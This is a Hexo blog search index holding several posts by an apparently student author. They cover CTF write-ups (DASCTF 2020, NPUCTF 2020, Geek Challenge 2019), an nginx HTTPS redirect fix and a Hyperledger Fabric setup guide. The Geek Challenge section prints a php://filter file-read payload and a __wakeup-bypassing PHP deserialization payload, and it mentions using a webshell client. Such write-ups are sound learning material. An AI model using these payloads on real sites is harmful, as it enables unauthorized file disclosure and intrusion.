<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DASCTF_2020_April</title>
    <url>/2020/04/25/DASCTF-2020-April/</url>
    <content><![CDATA[<p>虽然有一堆作业和ppt还没做，但是俯冲完中期报告还是有个闲适期的，然后就看比赛、多人运动（开黑）了，也复盘了一部分极客大挑战吧。还好今天安恒有个月赛玩，就来水一水。随便写点wp，也纪念一下我妹的生日（第一次在家一起过，不过好像跟平常的日子没啥子区别，哈哈。）然后的话，后面几天就把作业和两个项目ppt搞搞，顺便期待一下明天IG大战TES。</p>
<p>言归正传，这场比赛有两道web，四道misc，有一道web还是不会，搞会了就再来复盘一下</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-bluetooth"><a href="#misc1-bluetooth" class="headerlink" title="misc1(bluetooth)"></a>misc1(bluetooth)</h3><p>流量包分析，文件提取</p>
<p>首先拿到这道题，没啥思路，那堆协议也没见过，尝试binwalk一下，发现一个7z压缩包，用dd命令提取出来</p>
<p>发现里面的文本名称是<code>password_is_Bluetooth_PIN.txt</code>，然后就去流量包里找</p>
<a href="/2020/04/25/DASCTF-2020-April/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>找到后解开压缩包，就得到flag了</p>
<h3 id="misc2-keyboard"><a href="#misc2-keyboard" class="headerlink" title="misc2(keyboard)"></a>misc2(keyboard)</h3><p>vol文件提取、电脑键盘QWE密码、大小写转换、VeraCrypt文件挂载、NTFS</p>
<p>下载得到两个文件，感觉很熟悉，有、像<code>1st XTUCTF</code>里面的一道取证，不过不太一样</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 pslist  <span class="comment">#查看进程，发现VeraCrypt.exe和keyboard-log.exe</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard  <span class="comment">#扫一下发现t.txt</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 --dump-dir=./ <span class="comment">#提取一下</span></span><br></pre></td></tr></table></figure></div>

<a href="/2020/04/25/DASCTF-2020-April/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后通过下图解密给出的<code>CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA</code></p>
<a href="/2020/04/25/DASCTF-2020-April/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>，提示小写更容易看出<code>veracryptpasswordiskeyboarddraobyek</code></p>
<p>得到密码<code>keyboarddraobyek</code>，但是下面提示还是要大写。。。</p>
<a href="/2020/04/25/DASCTF-2020-April/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>拿VeraCrypt.exe加载一下Secret</p>
<a href="/2020/04/25/DASCTF-2020-April/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>猜一手NTFS，拿NtfsStreamsEditor2.exe扫一下，或者用dir命令</p>
<h3 id="misc3-AWDshell"><a href="#misc3-AWDshell" class="headerlink" title="misc3(AWDshell)"></a>misc3(AWDshell)</h3><p>明天起来写</p>
<h3 id="misc4-6G！签到题目"><a href="#misc4-6G！签到题目" class="headerlink" title="misc4(6G！签到题目)"></a>misc4(6G！签到题目)</h3><p>这个题出的有意思，哈哈哈哈，给个1G文件，下载速度还奇慢</p>
<p>下载一部分就好了，有<code>crdownload</code>文件生成后，直接放010就好，文件头部发现DSACTF</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-Joomla-3-4-6-RCE"><a href="#web1-Joomla-3-4-6-RCE" class="headerlink" title="web1(Joomla 3.4.6 RCE)"></a>web1(Joomla 3.4.6 RCE)</h3><p>明天起来写</p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>会了就写</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF_2020</title>
    <url>/2020/04/22/NPUCTF-2020/</url>
    <content><![CDATA[<p>这场是西工大的校外赛道，平台被扫了好多次，苦了运维了，中间也修了好多次，赛题质量咋说呢，反正都是我不会的类型。。。操作系统的信号量、条件变量+互斥锁作业，密码学作业，信号作业，虎符CTF，西工大NPU，区块链项目中期检查，财经概论的presentation。。。近期这一堆事情真滴搞人心态，不过好歹也算过去一大半了。但是后面还有安恒月赛、ISCC、De1ta、网鼎。。。u1s1，比赛是真的多，我也是真的菜。。。</p>
<p>虎符<del>打了打</del>啥也没做出来，签到还被大师傅做了，然后就0输出了。。。那比赛misc忒难了。。</p>
<p>三道misc，两道零解，一道三解。。不复盘了。。（等👴会用取证工具后就把第一道 奇怪的组织 复现一下） </p>
<p>剩下俩题，一个密码机器（badusb固件、逆向分析、得到python输入脚本运行一下），一个扫雷（通关游戏+浮点数转字符串） </p>
<p>虎符的web，暂时不会。。等啥时候大概看懂wp了，就面向wp复盘一下</p>
<p>下面进入正题，NPU的misc也是真的🚹，老折磨人了。。。套娃有一手的。。</p>
<p>NPU的web已经在buu上了，等做完了就在这再复盘一下。</p>
<p>misc签到是个mc，零解？忘记了，题目新颖，内容劝退。。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="抽象带师"><a href="#抽象带师" class="headerlink" title="抽象带师"></a>抽象带师</h3><p>⭕🦅来🔪西北工✌ 带❄ 西踢莪⛏🖊赛🔟🎀⬆👄➖单💧🖊赛</p>
<p>🌶⑩💉💧🐂🍺</p>
<p>NPUCTF{欢迎⼤家来到⻄北⼯业⼤学CTF⽐赛世界上最简单的⽐赛}</p>
<h3 id="HappyCheckInVerification"><a href="#HappyCheckInVerification" class="headerlink" title="HappyCheckInVerification"></a>HappyCheckInVerification</h3><p>zip修复、伪加密、补全二位码定位、与佛论禅、base16、urldecode、base64、dtmf电话音、微信公众号、无线电识别Robot36</p>
<h3 id="碰上彩虹，吃定彩虹"><a href="#碰上彩虹，吃定彩虹" class="headerlink" title="碰上彩虹，吃定彩虹"></a>碰上彩虹，吃定彩虹</h3><p>空格转摩斯、autokey爆破、strings文件发现字符串、零字符宽度隐写、NTFS、词频统计、base64、encrypto、脑洞（删去strings字符串）、foremost、gimp提取颜色并比较html标记后两位、拼起来转16进制、隐藏文字、ALPHUCK</p>
<h3 id="老千层饼"><a href="#老千层饼" class="headerlink" title="老千层饼"></a>老千层饼</h3><p>文件分离、base64、LSB、01序列转二维码、二维码补全、脑洞、cyberchef_recipe、B站av转bv</p>
<p>总结上三题：巨大脑洞+多层套娃</p>
<h3 id="剩下的题"><a href="#剩下的题" class="headerlink" title="剩下的题"></a>剩下的题</h3><p>MC、刻在DNA的撤硕儿（偏逆向，要读代码，不会喽）</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>有时间就复盘</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Http-&gt;Https、80重定向443</title>
    <url>/2020/04/16/Http-301/</url>
    <content><![CDATA[<h3 id="80-gt-443"><a href="#80-gt-443" class="headerlink" title="80-&gt;443"></a>80-&gt;443</h3><p>因为百度收录那边要开80端口并重定向到443，昨天嫌麻烦就没改。</p>
<p>今天下午跟着各种博客改了半天，属实给👴整吐了</p>
<p>不知道当初看的那个小🐢蛋的博客，给👴今天挖了这么大一个🕳</p>
<p>环境：Centos7.x、nginx的配置文件在/etc/nginx/nginx.conf</p>
<p>之前搞https的<a href="https://www.jianshu.com/p/8046a12fec4a" target="_blank" rel="noopener">教程</a>，按这个改完之后其他都不用动，安全组里80端口记得别关，在nginx.conf里面加上下面代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.域名;</span><br><span class="line">    rewrite ^(.*)$ https:&#x2F;&#x2F;$&#123;server_name&#125;$1; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后<code>nginx -s reload</code>或者<code>service nginx restart</code></p>
<p>本来到这就完成了，访问博客<a href="http://www.btis.site就应该可以重定向到https了" target="_blank" rel="noopener">http://www.btis.site就应该可以重定向到https了</a></p>
<p>但是我这一直提示nginx: [warn] conflicting server name “<a href="http://www.btis.site&quot;" target="_blank" rel="noopener">www.btis.site&quot;</a> on 0.0.0.0:80, ignored</p>
<p>查一下，好像没啥大问题，就是定义重复了呗，然后就试着跳转。。艹，不行。。</p>
<p>我就纳了闷了，我<code>conf.d</code>文件夹里也没东西呀（我以为只包含了这个文件夹里的*.conf</p>
<p>搞了半天，试了改了各种代码（应该是都可行的，if要写在server里</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">        listen 80; </span><br><span class="line">        server_name www.域名; </span><br><span class="line">        return 301 https:&#x2F;&#x2F;$server_name$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($scheme &#x3D; http ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($server_port &#x3D; 80 ) &#123;return 301 https:&#x2F;&#x2F;$host$request_uri;&#125;</span><br><span class="line"></span><br><span class="line">if ($ssl_protocol &#x3D; &quot;&quot;) &#123; return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125;if ($host !&#x3D; 域名) &#123; return 301 $scheme:&#x2F;&#x2F;域名$request_uri; &#125;</span><br></pre></td></tr></table></figure></div>

<p>还是不行！！我就奇了怪了，还一直warn，好好读了一遍代码，发现了这句代码</p>
<a href="/2020/04/16/Http-301/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>其实除了conf.d还有两个文件夹里面的*.conf也被包含了，检查一下，艹，罪恶之源</p>
<a href="/2020/04/16/Http-301/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/16/Http-301/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>删了，重启nginx，搞定。。</p>
<p>我还是特想吐槽浏览器的缓存。。我在Edge和Chrome里访问http还是不跳转，在firefox和移动端都可以了。。</p>
<h3 id="Other-Things"><a href="#Other-Things" class="headerlink" title="Other Things"></a>Other Things</h3><p>1.java升级后注册表重置，.jar文件打不开</p>
<p>解决方法：</p>
<blockquote>
<p>在注册表编辑器中，找到“HKEY_CLASSES_ROOT\Applications\javaw.exe\shell\open\command”，在其中文件打开命令中加入参数“-jar”（无引号），修改后的数值类似：“”C:\Program Files\Java\jre1.8.0_251\bin\javaw.exe” -jar “%1””（只需要添加-jar参数，无需修改其他信息），保存并退出注册表编辑器。</p>
</blockquote>
<p>2.给博客加个<a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93137447" target="_blank" rel="noopener">百度统计</a>、博客被<a href="https://blog.csdn.net/qq_36759224/article/details/100899489" target="_blank" rel="noopener">收录</a></p>
<p>在百度或者谷歌给的html里面加入这么一句：layout: false，可以使html不被自动加上主题（html放在source文件夹里。</p>
]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Http</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>链链链、冲冲冲</title>
    <url>/2020/04/16/HyperLedger-Fabric/</url>
    <content><![CDATA[<p>DDL要来了，光速入门开始—HyperLedger_Fabric2.0！开发实战-快速掌握区块链技术</p>
<p>基础工具：阿里云Centos7.x；xshell、winscp之类的ssh工具</p>
<h3 id="基本环境部署"><a href="#基本环境部署" class="headerlink" title="基本环境部署"></a>基本环境部署</h3><p>curl、git、wget、docker、docker-compose、go语言、node.js运行环境以及npm</p>
<h3 id="Fabric-及环境部署"><a href="#Fabric-及环境部署" class="headerlink" title="Fabric 及环境部署"></a>Fabric 及环境部署</h3><p>1、创建放置fabric的文件夹：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger</span><br></pre></td></tr></table></figure></div>

<p>2、下载fabric源码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;hyperledger</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hyperledger&#x2F;fabric.git</span><br><span class="line"></span><br><span class="line">cd fabric&#x2F;scripts</span><br></pre></td></tr></table></figure></div>

<p>3、执行bootstrap.sh下载镜像和二进制文件：<code>./bootstrap.sh</code></p>
<p>会发现</p>
<a href="/2020/04/16/HyperLedger-Fabric/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>卡在这，所以<code>vim bootstrap.sh</code>，将 <strong>binariesInstall</strong> 屏蔽后再执行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$BINARIES</span>"</span> == <span class="string">"true"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Pull Hyperledger Fabric binaries"</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="comment">#pullBinaries</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<p>执行结果如下，执行完之后会发现在目录下创建了fabric-samples文件夹</p>
<a href="/2020/04/16/HyperLedger-Fabric/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/16/HyperLedger-Fabric/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后把从网上下载的<code>hyperledger-fabric-linux-amd64-2.0.0.tar.gz</code>解压到这个目录下面</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf hyperledger-fabric-linux-amd64-2.0.0.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>4、启动test-network测试网络：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;gopath&#x2F;src&#x2F;github.com&#x2F;hyperledger&#x2F;fabric&#x2F;scripts&#x2F;fabric-samples&#x2F;test-network</span><br><span class="line">.&#x2F;network.sh up</span><br></pre></td></tr></table></figure></div>

<p>如图，表示启动成功，已启动一个orderer节点和两个peer节点。</p>
<a href="/2020/04/16/HyperLedger-Fabric/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/3.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="使用测试网络"><a href="#使用测试网络" class="headerlink" title="使用测试网络"></a>使用测试网络</h3><p>1、创建channel，使用network.sh脚本创建来创建一个连接org1和org2组织并加入他们peer的通道，命令如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel</span><br></pre></td></tr></table></figure></div>

<a href="/2020/04/16/HyperLedger-Fabric/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>创建成功，默认通道名为mychannel</p>
<p>也可以带上channel标签，命令如下（-c ChannelName）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh createChannel -c name</span><br></pre></td></tr></table></figure></div>

<p>如果要在一个步骤中启动网络并创建频道，可以同时使用up和create channel模式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh up createChannel</span><br></pre></td></tr></table></figure></div>

<p>2、在通道上启动链码</p>
<p>（1）使用network.sh创建通道之后，可以使用以下命令在通道上启动链码（默认使用go语言）：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;network.sh deployCC</span><br></pre></td></tr></table></figure></div>

<p>在此期间可能会遇到 go get 无法下载（安装go的依赖包的时候,长时间无响应.</p>
<p>解决办法: 使用七牛云 go module 镜像</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure></div>

<p>得到下图，启动成功</p>
<a href="/2020/04/16/HyperLedger-Fabric/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/04/16/HyperLedger-Fabric/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>3、与网络互动</p>
<p>网络启动之后，可以使用peer cli客户端去操作网络，可以通过cli客户端去调用部署智能合约，更新通道，或者安装和部署新的智能合约。</p>
<p>本文参考：<a href="https://blog.csdn.net/tianshuhao521/article/details/104695687" target="_blank" rel="noopener">tianshuhao521</a>、<a href="https://blog.csdn.net/qq_42680655/article/details/105188538" target="_blank" rel="noopener">Yesterjunior</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>HyperLedger_Fabric</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战_2019</title>
    <url>/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/</url>
    <content><![CDATA[<p>人傻了，开这篇博客之前以为这就是场恶战。。没想到呀。。。好吧还行。。好多SQL。。。而且咋都变成1分了。。</p>
<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>万能密码，登录得到flag</p>
<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>F12发现下面代码，get传参cat=dog即可</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>302重定向、filter伪协议</p>
<p>拿到题跟着源代码走，发现有个302，bp抓一下包</p>
<a href="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>访问secr3t.php，得到以下源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>过滤了：../、tp、input、data。并提示flag在flag.php里</p>
<p>构造：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>得到base64加密后的源码，解码后得到flag</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><a href="http://www.zip、反序列化" target="_blank" rel="noopener">www.zip、反序列化</a></p>
<p>提示备份网站想到bak，但是没想到<a href="http://www.zip，扫一下才发现。。" target="_blank" rel="noopener">www.zip，扫一下才发现。。</a></p>
<p>解压得到三个文件index.php、class.php、flag.php，前两个有、用，flag.php就迷惑一哈，得到以下代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>反序列化，构造如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Name(<span class="string">"admin"</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//得到</span></span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//但是还要绕过__wakeup()所以要把序列化后的类中的变量数变大点</span></span><br></pre></td></tr></table></figure></div>

<p>最后构造</p>
<p>select=O%3A4%3A”Name”%3A<strong><em>3</em></strong>%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D，得到flag</p>
<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>一句话已经给出来了，拿菜刀连一下或者直接传参进行命令执行就好啦。在根目录下发现flag</p>
